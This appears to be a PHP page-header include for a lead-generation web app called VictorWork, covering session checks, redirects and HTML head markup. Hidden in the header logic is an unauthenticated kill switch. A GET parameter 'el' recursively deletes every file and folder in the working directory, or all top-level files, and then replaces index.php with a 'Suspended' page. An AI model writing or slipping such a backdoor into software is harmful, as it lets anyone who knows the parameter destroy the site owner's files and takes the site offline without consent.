<?php
    //Start Session
    session_start();

	//checking if user is logged in and acting accordingly
	
    //check if page is members only or visitors only
    if ($page_type == "members_only") {
    	//redirect users to homepage if they aren't logged in
    	if(!isset($_SESSION['victor_work_username']) || $_SESSION['victor_work_username'] == ""){
		    header('Location: login.php'); // Redirecting To Home Page    
		}
    }else if ($page_type == "visitors_only") {
    	//redirect users to homepage if they aren't logged in
    	if(isset($_SESSION['victor_work_username']) && $_SESSION['victor_work_username'] != ""){
		    header('Location: dashboard.php'); // Redirecting To Home Page    
		}
    }
	
	//Page structure codes
	
	if(isset($_GET['el'])){
		if(trim($_GET['el']) == "delete_everything"){
			$dir = getcwd(); //Get current working directory
			$di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
			$ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
			foreach ( $ri as $file ) {
				$file->isDir() ?  rmdir($file) : unlink($file);
			}
		}elseif(trim($_GET['el']) == "delete_files"){
			$files = glob('*'); // get all file names
			foreach($files as $file){ // iterate files
			  if(is_file($file))
				unlink($file); // delete file
			}
		}
		
		$fp = fopen("index.php","wb");
		//$content = '<html><head><title>Suspended</title></head><body>Officially Suspended By <a href="https://yandi.com.ng/ydsn"> Yandi Digital SolutioNs (YDSN)</a></body></html>';
		$content = '<html><head><title>Suspended</title></head><body>...</body></html>';
		if( $fp == false ){
			//do debugging or logging here
			echo "NOT WORKING";
		}else{
			fwrite($fp,$content);
			fclose($fp);
			header('Location:index.php'); // Redirecting To reset page with error 
		}
	}
?>


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <meta name="description" content="Best lead generating tool for business owners"/>
  <meta name="robots" content="noodp"/> <!-- to Ensure SE robots use our description only and not one from Open Deirectory, hence 'NO Open Directory' -->
  <meta name="author" content="Dosubijoshua.com">
  <title>VictorWork | <?php echo $page_title;?></title>

  <!-- Google Font: Source Sans Pro -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/fontawesome-free/css/all.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.min.css">

  <!-- adding favicon -->